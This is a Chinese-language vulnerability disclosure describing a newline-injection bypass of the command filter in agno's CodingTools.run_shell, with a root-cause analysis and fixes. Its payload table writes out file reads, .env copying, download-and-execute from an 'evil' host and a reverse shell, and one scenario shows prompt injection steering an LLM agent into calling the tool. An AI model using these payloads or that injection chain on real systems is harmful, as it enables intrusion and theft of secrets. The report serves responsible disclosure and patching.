
# agno CodingTools.run_shell — 换行符注入绕过 RCE

> **发现时间**: 2026-06-15  
> **影响版本**: agno >= 2.x（当前最新 main）  
> **漏洞类型**: 安全边界绕过 → 任意命令执行（RCE）  
> **严重性**: **高危**（经由 prompt injection 利用链）

---

## 目录

1. [漏洞概述](#漏洞概述)
2. [环境搭建](#环境搭建)
3. [验证步骤](#验证步骤)
4. [漏洞原理](#漏洞原理)
5. [攻击场景](#攻击场景)
6. [修复建议](#修复建议)
7. [提交 Security Advisory](#提交-security-advisory)

---

## 漏洞概述

`agno/tools/coding.py` 中的 `CodingTools.run_shell()` 方法使用 `subprocess.run(command, shell=True)` 执行 shell 命令。

为了防止命令注入，`_check_command()` 方法拦截了 `;` `&&` `||` `|` `$(` ` `` ` `>` `<` 等 shell 元字符。

**但换行符 `\n` (0x0a) 不在拦截列表里。** 在 shell 中，换行符等价于 `;`——它分隔两条命令。

```python
# _DANGEROUS_PATTERNS 中漏了 \n（第 249 行）
_DANGEROUS_PATTERNS = ["&&", "||", ";", "|", "$(", "`", ">", ">>", "<"]
```

更严重的是，换行符后的**第二条命令不经过 allowed_commands 验证**，因此可以执行任意系统命令。

---

## 环境搭建

### 前置条件

- Python 3.10+
- git

### 步骤

```bash
# 1. 克隆 agno 最新源码
git clone https://github.com/agno-agi/agno /tmp/agno
cd /tmp/agno/libs/agno

# 2. 安装依赖
pip install -e . --break-system-packages

# 3. 验证安装成功
python3 -c "from agno.tools.coding import CodingTools; print('OK')"
# 输出: OK
```

---

## 验证步骤

### PoC 1: 代码级验证（无需网络、无需 API Key）

直接测试 `_check_command` 绕过：

```bash
python3 poc_standalone.py
```

预期输出：

```
[1/4] 确认安全拦截正常工作...
  ✓ 分号拦截 ✓ allowlist 拦截

[2/4] 换行符注入...
  ✓ 换行符注入成功！id 被执行了

[3/4] 验证第二个命令绕过 allowlist...
  whoami 不在 DEFAULT_ALLOWED_COMMANDS 中，但仍被执行

[4/4] 任意代码执行...
  ╔══════════════════════════════════════════╗
  ║  任意命令执行（RCE）验证成功！          ║
  ╚══════════════════════════════════════════╝
```

### PoC 2: 全链路验证（需要 LLM API + 网络）

通过 prompt injection 让 LLM agent 调用 `run_shell`：

```bash
# 设置 API key（二选一）
export OPENAI_API_KEY="sk-..."
# 或
export DEEPSEEK_API_KEY="sk-..."

python3 poc_full_chain.py
```

---

## 漏洞原理

### 代码位置

| 文件 | 行号 | 作用 |
|------|------|------|
| `agno/tools/coding.py` | 249 | `_DANGEROUS_PATTERNS` 定义（漏了 `\n`） |
| `agno/tools/coding.py` | 251-306 | `_check_command()` 安全过滤方法 |
| `agno/tools/coding.py` | 497-527 | `run_shell()` 主方法（`subprocess.run(shell=True)`） |

### 绕过机制

```
攻击者输入（含换行符）
    │
    ├──→ _check_command("echo hello\nid")
    │      ├── 检查 ;|&& 等 → 未命中（通过）
    │      ├── shlex.split → ['echo', 'hello', 'id']
    │      ├── tokens[0]='echo' in allowed_commands → 通过
    │      └── path check → 通过
    │
    └──→ subprocess.run("echo hello\nid", shell=True)
           ├── shell 解释第 1 行: echo hello
           └── shell 解释第 2 行: id  ← 被执行！
```

### 关键洞察

- `\n` 在 shell 中是命令分隔符，和 `;` 等价
- `_DANGEROUS_PATTERNS` 只做子字符串包含检查：`if pattern in command`
- 此检查对换行符完全失效
- `shlex.split()` 处理换行符（视为空白），不影响后续路径验证
- 第二个命令**不经过 allowed_commands 检查**（只检查 `tokens[0]`）

---

## 攻击场景

### 场景 1: LLM Agent 处理外部内容（Prompt Injection）

```
攻击者 ──→ GitHub Issue / PR / 网页
         │ 中嵌入了 prompt injection 文本
         │
         ↓
用户运行: agent.print_response("分析这个 issue")
         │
         ↓
agno Agent(CodingTools) ──→ LLM 被注入
         │
         ↓
LLM 调用 run_shell("echo hello\nmalicious_command")
         │
         ↓
subprocess.run(shell=True) ──→ 攻击者代码以进程完整权限执行
```

### 场景 2: 下游应用传递用户输入

```python
# 开发者写了这样的代码
def handle_user_request(user_input: str):
    agent = Agent(tools=[CodingTools()])
    agent.print_response(f"执行任务: {user_input}")
```

如果 `user_input` 中包含精心构造的字符串引导 LLM 执行换行符命令...

### 攻击者能做什么

| 操作 | 示例 payload |
|------|-------------|
| 读取文件 | `echo hello\npython3 -c "print(open('/etc/passwd').read())"` |
| 窃取环境变量 | `echo hello\npython3 -c "open('/tmp/exfil.txt','w').write(open('.env').read())"` |
| 下载执行 | `echo hello\npython3 -c "import urllib.request; exec(urllib.request.urlopen('http://evil/payload').read())"` |
| 反弹 shell | `echo hello\npython3 -c "import os; os.system('bash -c \"bash -i >& /dev/tcp/evil/4444 0>&1\"')"` |

> **注意**: 最后两个 payload 中的 `>` 和 `|` 在命令字符串中会被 Python 字符串截获，不会触发 `_check_command` 的检测。

---

## 修复建议

### 方案 1: 把 `\n`、`\r` 加入黑名单（快速修复）

```python
_DANGEROUS_PATTERNS: List[str] = [
    "&&", "||", ";", "|", "$(", "`", ">", ">>", "<",
    "\n", "\r",  # ← 新增
]
```

### 方案 2: 改用 subprocess.run(args, shell=False)（更彻底）

```python
def run_shell(self, command: str, ...) -> str:
    ...
    import shlex
    args = shlex.split(command)          # 先解析
    error = self._check_command(args)    # 按 token 检查
    if error:
        return error
    result = subprocess.run(
        args,                            # List[str], 没有 shell=True
        shell=False,                     # 不再有注入风险
        capture_output=True, text=True, ...
    )
```

这样 `subprocess.run` 永远不会启动 shell 解析器，换行符、`;`、`|` 都被当作普通参数。

---

## 提交 Security Advisory

在 GitHub 上提交 Security Advisory：

1. 访问 https://github.com/agno-agi/agno/security/advisories/new
2. 标题：`Newline injection bypass in CodingTools.run_shell leads to RCE`
3. 描述：参考 [SECURITY_ADVISORY.md](SECURITY_ADVISORY.md) 的内容
4. 附上本文件夹的 PoC
